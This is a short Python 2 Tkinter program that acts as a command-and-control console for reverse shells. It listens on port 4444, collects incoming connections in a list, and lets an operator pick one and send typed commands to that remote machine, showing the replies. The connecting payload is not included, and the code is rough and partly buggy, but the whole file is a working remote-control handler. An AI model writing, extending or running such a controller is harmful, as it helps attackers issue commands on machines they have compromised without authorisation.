import socket
from Tkinter import *
import threading


class Start():
    def __init__(self):
        self.addrlist = []
        self.connlist = []
        self.root = Tk()
        self.root.geometry("600x400")
        self.listbox = Listbox(self.root, width=80, bg="black", fg="#ffff00")
        self.listbox.place(x=0, y=0)
        self.listbox.bind('<<ListboxSelect>>', self.optionshell)
        self.conn = self.optionshell
        self.listbox.insert(0, "google")
        self.butt = Button(self.root, text="reflsh", command=self.checksend)
        self.butt.place(x=500, y=190)
        t1 = threading.Thread(target=self.socketopen)
        t1.daemon = True
        t1.start()

        mainloop()

    def shellwindow(self):
        print self.conn
        self.root2 = Tk()
        self.root2.geometry("500x500")
        self.text2 = Text(self.root2, bg="black",fg="green" )
        self.text2.place(x=0, y=0)
        self.eny2 = Entry(self.root2)
        self.eny2.place(x=0, y=450)
        self.butt2 = Button(self.root2, text="send", command=self.sendShell)
        self.butt2.place(x=200, y=450)

    def sendShell(self):
        ds = self.eny2.get()
        print ds
        self.conn.send(ds)
        fa = self.conn.recv(2000)
        print fa
        self.text2.insert(1.0, fa)

    def optionshell(self, w):
        exevalue = self.listbox.curselection()
        print exevalue
        goog = "s"
        for g in exevalue:
            print g
            target = g
            target = int(target)
            self.conn = self.connlist[target]
            print str(self.addrlist[target][0] + '> ')
            self.shellwindow()
            return self.conn

    def checksend(self):
        print "hello"

        for i, self.conn in enumerate(self.connlist):
            self.listbox.delete(i, i)
            try:
                self.conn.send("1")
                cd = self.conn.recv(200)
                print cd
                ffff = self.conn, self.addr, cd
                self.listbox.insert(i, str(ffff))
            except:
                del self.connlist[i]
                del self.addrlist[i]
                self.listbox.delete(i, i)
            print i

    def socketopen(self):
        self.host = "127.0.0.1"
        self.port = 4444
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print "the server started!!"
        while True:
            try:
                self.s.bind((self.host, self.port))
                self.s.listen(3)
                print "the server started!!"
                while True:
                    try:
                        self.conn, self.addr = self.s.accept()
                        print self.addr, self.conn
                        self.connlist.append(self.conn)
                        self.addrlist.append(self.addr)
                        print self.connlist
                    except:
                        pass

            except:
                pass


Start2 = Start()


def main():
    Start2


main()
